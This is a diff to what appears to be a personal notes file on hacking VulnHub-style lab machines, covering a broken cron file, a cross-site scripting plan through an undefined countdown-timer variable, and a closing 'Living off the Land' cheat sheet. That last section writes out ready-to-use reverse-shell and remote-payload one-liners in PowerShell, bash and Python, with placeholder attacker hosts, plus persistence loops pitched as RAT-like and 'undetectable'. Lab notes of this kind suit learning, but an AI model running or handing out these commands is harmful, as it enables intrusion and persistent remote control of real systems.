@@ -139,6 +139,18 @@
 
 	Next steps include crafting a malicious payload to make the guest account give us the tmp account password, and maybe more!
 
+	So after some digging, I found a root file viewable by guest. But its 
+	malformed and broken. anoncron. It details that it can't activate due to 
+	being in a temporary enviroment, nor can it find the timestamp logs to run 
+	the cron jobs. I wonder what jobs await? Whatever it is, its not running, 
+	and it is likely that there is something hidden in the cron jobs that can 
+	be exploited. Maybe a sys tail?
+
+	Im torn. On one hand, I feel like editing the anoncron would be too easy 
+	for this box, and frankly just want to code malware with this gift from 
+	vulnhub. On the other hand, it is likely that there is something hidden in 
+	the cron jobs that can be exploited, and it would be a shame to not explore 
+	that avenue. 
 
 ### 3.) Porteus=157 (Python3 HTTP Web Server)
 
@@ -914,5 +926,37 @@ I'm learning alot about javascript for someone who mains python and dabbled in h
 
 So the main breakage with the scripting of this website, and why its vulnerable. IS IN FACT THE COUNTDOWN TIMER. It calls for "someVariable" so that the countup from 2018/10/17 to the current date can be calculated. But the variable is never defined, so we can put whatever we want in there. So if we put in a simple alert("hello world"), it will execute that code. So we can put in a simple reverse shell payload, and it will execute that code. This is the main breakage of the website, and it is likely that there is something hidden in the countdown timer that can be exploited. Ironic that of course when the timer breaks, its a "zero-day" countdown AND vulnerability.
 
-After some brief testing, I've concluded that the best route to the next foothold is through the countdown timer, and cross-site scripting. Which is REALLY ironic since its the matrix, blending two realities as it were. Nerds. We will craft a malicious payload for the someVariable function of the countdown timer, and then execute that payload to get a reverse shell. If I get Marlin done first, I can do a chain attack and use the reverse shell from Marlin to execute the payload on Porteus, which would be really cool. :Dz
+After some brief testing, I've concluded that the best route to the next foothold is through the countdown timer, and cross-site scripting. Which is REALLY ironic since its the matrix, blending two realities as it were. Nerds. We will craft a malicious payload for the someVariable function of the countdown timer, and then execute that payload to get a reverse shell. If I get Marlin done first, I can do a chain attack and use the reverse shell from Marlin to execute the payload on Porteus, which would be really cool. :D
 
+So an update:
+
+	We're in, but its a locked down root account with little permissions to its name. Theres a "nobody" account that has more permissions than root. We have our target, and we have our goal in sight. The /root folder is locked down, and the obvious target is nobody. In addition, there is a mysql datbase running. Perhaps the key to all the accounts lies in there. The etc/passwd file is viewable as well. This is interesting.
+	
+
+## Living off the Land Blurb
+
+I've discovered the joy of hacking only within the IDE and as few tools as possible. Even in the most restricted enviroments, scripts and text files are just data, and can be called even with noexec function, just with extra caveats. 
+
+Who needs third party software when you can just use the built in tools of the system to do your bidding? If the tools don't exist, build them. You'll have something better than what you could have downloaded, and it will be undetectable.
+
+Bash:
+
+	$ bash > /tmp/shell.sh
+
+Powershell:
+	$ powershell -c "IEX (New-Object Net.Webclient).downloadstring('http://<attackerip>:<port>/shell.ps1')"
+
+Python:
+	$ python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<attackerip>',<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
+
+Interestingly enough, if you want to simulate a RAT with persistence, you can use the following powershell command to create a reverse shell that will persist on the system:
+
+	$ powershell -c "while($true){IEX (New-Object Net.Webclient).downloadstring('http://<attackerip>:<port>/shell.ps1'); Start-Sleep -Seconds 60}"
+
+For bash thats:
+
+	$ echo "while true; do bash -i >& /dev/tcp/<attackerip>/<port> 0>&1; sleep 60; done" > /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh
+
+and python, my dream girl:
+
+	$ echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<attackerip>',<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" > /tmp/shell.py; chmod +x /tmp/shell.py; python /tmp/shell.py
